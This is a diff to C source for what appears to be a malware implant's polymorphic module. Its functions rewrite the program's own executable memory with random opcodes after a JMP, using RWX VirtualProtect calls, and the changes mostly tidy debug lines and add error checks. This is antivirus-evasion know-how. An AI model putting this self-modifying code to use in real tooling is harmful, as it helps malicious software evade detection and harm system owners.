@@ -16,9 +16,10 @@
 #if CONFIG_POLYMORPHIC == TRUE
 
 INT morphModule() {
-    //_tprintf("MORPHMODULE 17\n");
+
     INT returnValue = 1;
-// Reserved for future functionality
+/*
+ // Reserved for future functionality
 //#if CONFIG_OBFUSCATION == TRUE
 
     // unsigned char s_xk[] = S_XK;
@@ -33,17 +34,17 @@ INT morphModule() {
     // Reserved for future functionality
     // char * MARKER_MASK = "xxxxxxxxxxxxxxxxxxxxxxxx";
 //#endif
-
+*/
     // Declare the MODULEINFO struct to store module information.
     MODULEINFO modInfo;
-    //_tprintf("MORPHMODULE 37\n");
+
     // Obtain the current process handle.
     HANDLE hProcess = NtCurrentProcess;
 
     // Get a handle to the base module of the current process.
 
     HMODULE hModule = GetModuleHandle(NULL);
-    //_tprintf("MORPHMODULE 44\n");
+
     // If the module information is obtained successfully, enter the loop.
     if (GetModuleInformation(hProcess, hModule, &modInfo, sizeof(MODULEINFO)))
     {
@@ -139,8 +140,9 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
     byOpcodeIt++;
 
     // Insert random opcodes after the JMP instruction
-    for (; byOpcodeIt < byLength; byOpcodeIt++)
+    for (; byOpcodeIt < byLength; byOpcodeIt++){
         morphedOpcodes[byOpcodeIt] = rand() % MAXBYTE; // 0xFF
+    }
 
     // Change the protection of the memory to allow execution and write the morphed opcodes to memory
     DWORD dwOldProtect = 0x0;
@@ -170,16 +172,16 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
 
 #else
 
-
-    VirtualProtect(pbyDst, byLength, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+    check_debug(VirtualProtect(pbyDst, byLength, PAGE_EXECUTE_READWRITE, &dwOldProtect) != 0, "VirtualProtect (RWX) Failed!");
 
     mem_cpy((void *) pbyDst,  (void *) morphedOpcodes, (size_t) byLength);
 
     // Restore the original memory protection
-    VirtualProtect(pbyDst, byLength, dwOldProtect, &dwOldProtect);
+    check_debug(VirtualProtect(pbyDst, byLength, dwOldProtect, &dwOldProtect) != 0, "VirtualProtect (RX) Failed!");
 
 #endif //CONFIG NATIVE
     LEAVE:
+
     // Free the memory allocated for the morphed opcodes
     if(morphedOpcodes != NULL){
         LocalFree(*(PVOID*)morphedOpcodes);
